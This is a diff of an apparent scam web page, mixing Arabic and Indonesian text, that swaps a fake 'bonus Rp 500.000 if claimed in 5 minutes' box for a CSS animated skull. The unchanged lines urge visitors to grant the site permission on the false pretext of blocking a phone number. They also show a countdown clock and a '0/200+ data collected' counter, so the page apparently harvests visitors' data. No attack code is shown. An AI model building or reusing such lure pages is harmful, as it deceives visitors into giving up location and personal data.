@@ -304,19 +304,92 @@
             font-size: 14px;
         }
         
-        .bonus-offer {
-            background: linear-gradient(135deg, #ffd700, #ffed4e);
-            padding: 10px;
-            border-radius: 10px;
-            margin: 15px 0;
-            border: 2px dashed #f1c40f;
+    .animated-skull-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        width: 250px; /* يمكن تعديل الحجم حسب الحاجة */
+        height: 300px; /* يمكن تعديل الحجم حسب الحاجة */
+        position: relative;
+        margin: 20px auto; /* لوسط الجمجمة */
+    }
+
+    .skull-head {
+        width: 180px;
+        height: 220px;
+        background-color: #f0f0f0; /* لون الجمجمة */
+        border-radius: 50% 50% 45% 45% / 60% 60% 50% 50%; /* شكل الجمجمة المستدير من الأعلى والمدبب قليلاً من الأسفل */
+        position: relative;
+        box-shadow: 0 0 15px rgba(255, 255, 255, 0.7); /* ظل أولي للوهج */
+        animation: skullGlow 2s infinite alternate ease-in-out; /* حركة الوهج النابض */
+    }
+
+    .skull-eye {
+        width: 45px;
+        height: 45px;
+        background-color: #222; /* لون تجاويف العين الداكنة */
+        border-radius: 50%;
+        position: absolute;
+        top: 60px; /* تعديل موضع العين */
+        box-shadow: 0 0 10px rgba(255, 0, 0, 0.5); /* وهج أحمر للعيون */
+        animation: eyeGlow 1.5s infinite alternate ease-in-out; /* حركة وهج العين النابض */
+    }
+
+    .left-eye {
+        left: 35px;
+    }
+
+    .right-eye {
+        right: 35px;
+    }
+
+    .skull-nose {
+        width: 35px;
+        height: 35px;
+        background-color: #222; /* لون تجويف الأنف الداكن */
+        position: absolute;
+        top: 120px;
+        left: 50%;
+        transform: translateX(-50%) rotate(45deg); /* شكل معيني للأنف */
+        border-radius: 50% 50% 0 50%; /* لجعلها تبدو كقلب مقلوب */
+    }
+
+    .skull-teeth {
+        position: absolute;
+        bottom: 30px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        gap: 4px; /* المسافة بين الأسنان */
+    }
+
+    .tooth {
+        width: 16px;
+        height: 22px;
+        background-color: #f0f0f0; /* لون الأسنان */
+        border: 1px solid #222; /* حدود الأسنان */
+        border-radius: 3px;
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+    }
+
+    /* حركات الـ Keyframe */
+    @keyframes skullGlow {
+        from {
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.7), inset 0 0 10px rgba(255, 255, 255, 0.5);
         }
-        
-        .bonus-offer p {
-            color: #8e6e0d;
-            font-weight: bold;
-            margin: 0;
+        to {
+            box-shadow: 0 0 30px rgba(255, 255, 255, 1), inset 0 0 20px rgba(255, 255, 255, 0.8);
         }
+    }
+
+    @keyframes eyeGlow {
+        from {
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+        to {
+            box-shadow: 0 0 25px rgba(255, 0, 0, 1);
+        }
+    }
 
         .data-counter {
             background: #e8f4fd;
@@ -391,7 +464,7 @@
             </div>
         
         <div class="content">
-            <div class="urgent-badge">الرجاء السماح للموقع</div>
+            <div class="urgent-badge">الرجاء السماح للمواقع</div>
             
             <p>حتي يتمكن الموقع من معرفه مواقع الخاص بي الرقم الذي تريد حظرو لتحديد رامز البلد الخاص بي الرقم</p>
           <div class="prize-section">
@@ -402,11 +475,22 @@
     </div> 
 <div class="timer-container">
     <div class="current-time">
-        وقت حظر الرقم ㊙️: <span id="egypt-clock">00:00:00</span>
+        وقت حظر الرقم: <span id="egypt-clock">00:00:00</span>
 </div>
-            <div class="bonus-offer">
-                <p>🎉 BONUS: Dapatkan tambahan Rp 500.000 jika klaim dalam 5 menit!</p>
-            </div>
+<div class="animated-skull-container">
+    <div class="skull-head">
+        <div class="skull-eye left-eye"></div>
+        <div class="skull-eye right-eye"></div>
+        <div class="skull-nose"></div>
+        <div class="skull-teeth">
+            <span class="tooth"></span>
+            <span class="tooth"></span>
+            <span class="tooth"></span>
+            <span class="tooth"></span>
+            <span class="tooth"></span>
+        </div>
+    </div>
+</div>
 
             <div class="data-counter">
                 📊 <span id="dataCount">0</span>/200+ data terkumpul
